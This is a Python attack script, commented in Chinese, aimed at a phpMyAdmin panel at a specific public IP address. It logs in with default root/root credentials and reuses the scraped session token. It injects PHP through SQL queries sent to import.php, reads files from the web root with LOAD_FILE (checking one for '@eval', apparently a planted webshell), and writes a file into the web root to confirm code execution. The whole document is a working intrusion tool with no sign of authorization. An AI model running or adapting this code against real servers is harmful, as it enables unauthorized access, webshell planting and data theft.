#!/usr/bin/env python3
"""干净实验: 确认 phpMyAdmin import.php 是否执行 <?php ?> 代码
实验A: echo 标记 -> 看 SQL 结果
实验B: file_put_contents 写 zzz.txt -> 看文件
"""
import urllib.request, http.cookiejar, re, urllib.parse, time

B = "http://81.70.245.25/phpmyadmin/"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent", "Mozilla/5.0")]
html = op.open(B, timeout=10).read().decode("utf-8", "ignore")
tok = re.search(r'name="token" value="([a-f0-9]{32})"', html).group(1)
data = f"pma_username=root&pma_password=root&server=1&token={tok}".encode()
op.open(urllib.request.Request(B + "index.php", data=data), timeout=10).read()

def sql(q):
    qq = urllib.parse.urlencode({"token": tok, "sql_query": q, "ajax_request": "true", "db": "mysql"})
    r = op.open(urllib.request.Request(B + "import.php?" + qq, data=b""), timeout=15)
    return r.read().decode("utf-8", "ignore")

# 实验A: 纯 echo 标记 (payload 里没有标记外的其他输出)
r = sql("SELECT '<?php echo \"EXEC_MARKER_A1\";?>'")
print("A. echo实验 - 响应含EXEC_MARKER_A1:", "EXEC_MARKER_A1" in r, flush=True)
# 用 LOAD_FILE 看日志里实际记录了什么
time.sleep(1)
r2 = sql("SELECT LOAD_FILE('C:/phpStudy/WWW/gen2.php')")
print("B. gen2.php 内容里EXEC:", "EXEC_MARKER" in r2, "| @eval:", "@eval" in r2, flush=True)

# 实验C: 写 zzz.txt 测试文件
r3 = sql("SELECT '<?php file_put_contents(\"C:/phpStudy/WWW/zzz.txt\", \"ZZZ_OK_5566\"); echo \"WROTE_5566\";?>'")
print("C. 写文件实验 - 响应含WROTE_5566:", "WROTE_5566" in r3, flush=True)
time.sleep(1)
r4 = sql("SELECT LOAD_FILE('C:/phpStudy/WWW/zzz.txt')")
print("D. zzz.txt 内容含ZZZ_OK_5566:", "ZZZ_OK_5566" in r4, flush=True)
# 也直接HTTP访问
import urllib.request as ur
try:
    rr = ur.urlopen(urllib.request.Request("http://81.70.245.25/zzz.txt", headers={"User-Agent":"Mozilla/5.0"}), timeout=8)
    print("E. HTTP访问zzz.txt:", rr.status, rr.read()[:50], flush=True)
except Exception as e:
    print("E. HTTP访问zzz.txt ERR:", str(e)[:60], flush=True)
